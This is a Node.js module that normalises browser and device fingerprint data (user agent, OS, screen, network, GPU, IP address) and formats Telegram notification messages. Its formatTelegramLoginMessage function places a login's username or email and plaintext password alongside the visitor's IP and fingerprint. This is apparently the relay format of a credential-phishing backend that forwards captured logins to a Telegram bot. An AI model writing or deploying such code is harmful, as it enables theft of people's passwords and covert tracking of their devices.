const crypto = require('node:crypto');

const MAX_STRING_LENGTH = 512;
const MAX_LANGUAGES = 10;

const normalizeIp = (ip) => {
  if (!ip || typeof ip !== 'string') return null;
  const value = ip.trim();
  if (!value || value === '::ffff:127.0.0.1') return '127.0.0.1';
  if (value.startsWith('::ffff:')) return value.replace('::ffff:', '');
  return value;
};

const toBoolean = (value) => typeof value === 'boolean' ? value : null;

const sanitizeString = (value, maxLength = MAX_STRING_LENGTH) => {
  if (typeof value !== 'string') return null;
  const cleaned = value.replace(/\u0000/g, '').trim().slice(0, maxLength);
  return cleaned || null;
};

const sanitizeArray = (list, maxItems = MAX_LANGUAGES) => {
  if (!Array.isArray(list)) return [];
  return list
    .map((item) => sanitizeString(item, 128))
    .filter(Boolean)
    .slice(0, maxItems);
};

const sanitizeMap = (value) => {
  if (!value || typeof value !== 'object' || Array.isArray(value)) return {};

  return Object.entries(value).reduce((acc, [key, entryValue]) => {
    if (typeof entryValue === 'string') {
      const safeValue = sanitizeString(entryValue, 256);
      if (safeValue) acc[key] = safeValue;
    } else if (typeof entryValue === 'number' || typeof entryValue === 'boolean') {
      acc[key] = entryValue;
    } else if (Array.isArray(entryValue)) {
      acc[key] = entryValue.slice(0, 10).map((item) => sanitizeString(item, 256)).filter(Boolean);
    } else if (entryValue && typeof entryValue === 'object') {
      acc[key] = sanitizeMap(entryValue);
    }
    return acc;
  }, {});
};

const buildCapabilityStatus = (value) => (value === true ? 'available' : value === false ? 'unavailable' : 'not_exposed_by_browser');

const normalizeClientInfo = (payload = {}) => {
  const browser = payload.browser || {};
  const system = payload.system || {};
  const device = payload.device || {};
  const screen = payload.screen || {};
  const connection = payload.connection || {};
  const capabilities = payload.capabilities || {};

  const normalized = {
    browser: {
      name: sanitizeString(browser.name, 64),
      version: sanitizeString(browser.version, 64),
      userAgent: sanitizeString(browser.userAgent, 512),
      platform: sanitizeString(browser.platform, 128),
      language: sanitizeString(browser.language, 128),
      languages: sanitizeArray(browser.languages),
      timezone: sanitizeString(browser.timezone, 128),
      userAgentData: sanitizeMap(browser.userAgentData),
      status: {
        name: browser.name ? 'available' : 'unavailable',
        version: browser.version ? 'available' : 'unavailable',
        userAgent: browser.userAgent ? 'available' : 'unavailable',
        platform: browser.platform ? 'available' : 'unavailable',
        language: browser.language ? 'available' : 'unavailable',
        languages: Array.isArray(browser.languages) ? 'available' : 'unavailable',
        timezone: browser.timezone ? 'available' : 'unavailable',
        userAgentData: browser.userAgentData ? 'available' : 'unavailable'
      }
    },
    system: {
      os: sanitizeString(system.os, 128),
      osVersion: sanitizeString(system.osVersion, 128),
      architecture: sanitizeString(system.architecture, 64),
      cpuCores: Number.isFinite(Number(system.cpuCores)) ? Number(system.cpuCores) : null,
      cpuModel: sanitizeString(system.cpuModel, 128),
      ramGB: Number.isFinite(Number(system.ramGB)) ? Number(system.ramGB) : null,
      deviceType: sanitizeString(system.deviceType || device.type, 64),
      status: {
        os: system.os ? 'available' : 'unavailable',
        osVersion: system.osVersion ? 'available' : 'unavailable',
        architecture: system.architecture ? 'available' : 'unavailable',
        cpuCores: typeof system.cpuCores === 'number' ? 'available' : 'unavailable',
        cpuModel: system.cpuModel ? 'available' : 'not_exposed_by_browser',
        ramGB: typeof system.ramGB === 'number' ? 'estimated' : 'unavailable',
        deviceType: device.type ? 'available' : 'unavailable'
      }
    },
    device: {
      type: sanitizeString(device.type, 64),
      touchSupport: toBoolean(device.touchSupport),
      maxTouchPoints: Number.isFinite(Number(device.maxTouchPoints)) ? Number(device.maxTouchPoints) : 0,
      status: {
        type: device.type ? 'available' : 'unavailable',
        touchSupport: typeof device.touchSupport === 'boolean' ? 'available' : 'unavailable',
        maxTouchPoints: typeof device.maxTouchPoints === 'number' ? 'available' : 'unavailable'
      }
    },
    screen: {
      width: Number.isFinite(Number(screen.width)) ? Number(screen.width) : null,
      height: Number.isFinite(Number(screen.height)) ? Number(screen.height) : null,
      availableWidth: Number.isFinite(Number(screen.availableWidth)) ? Number(screen.availableWidth) : null,
      availableHeight: Number.isFinite(Number(screen.availableHeight)) ? Number(screen.availableHeight) : null,
      viewportWidth: Number.isFinite(Number(screen.viewportWidth)) ? Number(screen.viewportWidth) : null,
      viewportHeight: Number.isFinite(Number(screen.viewportHeight)) ? Number(screen.viewportHeight) : null,
      pixelRatio: Number.isFinite(Number(screen.pixelRatio)) ? Number(screen.pixelRatio) : null,
      colorDepth: Number.isFinite(Number(screen.colorDepth)) ? Number(screen.colorDepth) : null,
      orientation: sanitizeString(screen.orientation, 32),
      status: {
        width: screen.width ? 'available' : 'unavailable',
        height: screen.height ? 'available' : 'unavailable',
        availableWidth: screen.availableWidth ? 'available' : 'unavailable',
        availableHeight: screen.availableHeight ? 'available' : 'unavailable',
        viewportWidth: screen.viewportWidth ? 'available' : 'unavailable',
        viewportHeight: screen.viewportHeight ? 'available' : 'unavailable',
        pixelRatio: screen.pixelRatio ? 'available' : 'unavailable',
        colorDepth: screen.colorDepth ? 'available' : 'unavailable',
        orientation: screen.orientation ? 'available' : 'unavailable'
      }
    },
    connection: {
      type: sanitizeString(connection.type, 64),
      effectiveType: sanitizeString(connection.effectiveType, 32),
      downlink: Number.isFinite(Number(connection.downlink)) ? Number(connection.downlink) : null,
      rtt: Number.isFinite(Number(connection.rtt)) ? Number(connection.rtt) : null,
      saveData: toBoolean(connection.saveData),
      online: toBoolean(connection.online),
      status: {
        type: connection.type ? 'available' : 'unavailable',
        effectiveType: connection.effectiveType ? 'available' : 'unavailable',
        downlink: connection.downlink !== undefined ? 'available' : 'unavailable',
        rtt: connection.rtt !== undefined ? 'available' : 'unavailable',
        saveData: typeof connection.saveData === 'boolean' ? 'available' : 'unavailable',
        online: typeof connection.online === 'boolean' ? 'available' : 'unavailable'
      }
    },
    capabilities: {
      webgl: Boolean(capabilities.webgl),
      webgl2: Boolean(capabilities.webgl2),
      webAssembly: Boolean(capabilities.webAssembly),
      webSocket: Boolean(capabilities.webSocket),
      indexedDB: Boolean(capabilities.indexedDB),
      localStorage: Boolean(capabilities.localStorage),
      sessionStorage: Boolean(capabilities.sessionStorage),
      serviceWorker: Boolean(capabilities.serviceWorker),
      webWorkers: Boolean(capabilities.webWorkers),
      rtcPeerConnection: Boolean(capabilities.rtcPeerConnection),
      notifications: Boolean(capabilities.notifications),
      geolocation: Boolean(capabilities.geolocation),
      gpuVendor: sanitizeString(capabilities.gpuVendor, 128),
      gpuRenderer: sanitizeString(capabilities.gpuRenderer, 128),
      status: {
        webgl: buildCapabilityStatus(capabilities.webgl),
        webgl2: buildCapabilityStatus(capabilities.webgl2),
        webAssembly: buildCapabilityStatus(capabilities.webAssembly),
        webSocket: buildCapabilityStatus(capabilities.webSocket),
        indexedDB: buildCapabilityStatus(capabilities.indexedDB),
        localStorage: buildCapabilityStatus(capabilities.localStorage),
        sessionStorage: buildCapabilityStatus(capabilities.sessionStorage),
        serviceWorker: buildCapabilityStatus(capabilities.serviceWorker),
        webWorkers: buildCapabilityStatus(capabilities.webWorkers),
        rtcPeerConnection: buildCapabilityStatus(capabilities.rtcPeerConnection),
        notifications: buildCapabilityStatus(capabilities.notifications),
        geolocation: buildCapabilityStatus(capabilities.geolocation),
        gpuVendor: capabilities.gpuVendor ? 'available' : 'unavailable',
        gpuRenderer: capabilities.gpuRenderer ? 'available' : 'unavailable'
      }
    }
  };

  return normalized;
};

const getClientIpMetadata = (req, options = {}) => {
  const trustedProxyIps = new Set((options.trustedProxyIps || []).map((ip) => normalizeIp(ip)).filter(Boolean));
  const remoteAddress = normalizeIp(req?.socket?.remoteAddress || req?.ip || 'unknown');
  const forwardedFor = req?.headers?.['x-forwarded-for'];
  const forwardedIps = typeof forwardedFor === 'string'
    ? forwardedFor.split(',').map((ip) => normalizeIp(ip)).filter(Boolean)
    : [];

  let publicIp = remoteAddress || null;

  if (trustedProxyIps.size > 0 && trustedProxyIps.has(remoteAddress) && forwardedIps.length > 0) {
    publicIp = forwardedIps[0] || publicIp;
  }

  const ipVersion = publicIp && publicIp.includes(':') ? 'IPv6' : publicIp ? 'IPv4' : null;

  return {
    publicIp,
    ipVersion,
    receivedAt: new Date().toISOString()
  };
};

const generateClientInfoPayload = (payload = {}, serverMeta = {}) => {
  const normalized = normalizeClientInfo(payload);

  return {
    ...normalized,
    server: {
      publicIp: sanitizeString(serverMeta.publicIp, 128),
      ipVersion: sanitizeString(serverMeta.ipVersion, 16),
      receivedAt: sanitizeString(serverMeta.receivedAt, 64)
    }
  };
};

const formatTelegramClientInfo = (clientPayload = {}) => {
  const browser = clientPayload.browser || {};
  const system = clientPayload.system || {};
  const device = clientPayload.device || {};
  const screen = clientPayload.screen || {};
  const connection = clientPayload.connection || {};
  const capabilities = clientPayload.capabilities || {};
  const server = clientPayload.server || {};

  const lines = [
    'New client environment detected:',
    `IP: ${server.publicIp || 'unknown'}`,
    `Browser: ${browser.name || 'unknown'} ${browser.version || ''}`.trim(),
    `OS: ${system.os || 'unknown'} ${system.osVersion || ''}`.trim(),
    `Device: ${device.type || 'unknown'} / ${system.deviceType || 'unknown'}`,
    `Screen: ${screen.width || 'n/a'}x${screen.height || 'n/a'}`,
    `Network: ${connection.effectiveType || 'n/a'} / ${connection.type || 'n/a'}`,
    `Timezone: ${browser.timezone || 'n/a'}`,
    `Language: ${browser.language || 'n/a'}`,
    `Capabilities: ${[
      capabilities.webgl ? 'webgl' : null,
      capabilities.webgl2 ? 'webgl2' : null,
      capabilities.webAssembly ? 'wasm' : null,
      capabilities.webSocket ? 'websocket' : null,
      capabilities.indexedDB ? 'indexeddb' : null,
      capabilities.serviceWorker ? 'service-worker' : null,
      capabilities.geolocation ? 'geolocation' : null,
      capabilities.notifications ? 'notifications' : null,
      capabilities.rtcPeerConnection ? 'webrtc' : null
    ].filter(Boolean).join(', ') || 'none detected'}`
  ];

  const message = lines.join('\n');
  return message.length > 4096 ? `${message.slice(0, 4000)}\n... (truncated)` : message;
};

const formatTelegramLoginMessage = ({ identifier, password, clientInfo = {} }) => {
  const safeIdentifier = typeof identifier === 'string' ? identifier : 'unknown';
  const safePassword = typeof password === 'string' ? password : 'unknown';
  const clientMessage = formatTelegramClientInfo(clientInfo);

  return [
    'New login attempt detected:',
    `Username/Email: ${safeIdentifier}`,
    `Password: ${safePassword}`,
    '',
    clientMessage
  ].join('\n');
};

const createPersistedClientInfoRecord = (payload = {}, req = null) => {
  const serverMeta = req ? getClientIpMetadata(req, { trustedProxyIps: process.env.TRUSTED_PROXY_IPS?.split(',') || [] }) : {};
  const record = generateClientInfoPayload(payload, serverMeta);
  record.id = crypto.randomUUID();
  record.createdAt = new Date().toISOString();
  return record;
};

module.exports = {
  normalizeClientInfo,
  getClientIpMetadata,
  generateClientInfoPayload,
  formatTelegramClientInfo,
  formatTelegramLoginMessage,
  createPersistedClientInfoRecord,
  sanitizeString,
  sanitizeMap
};
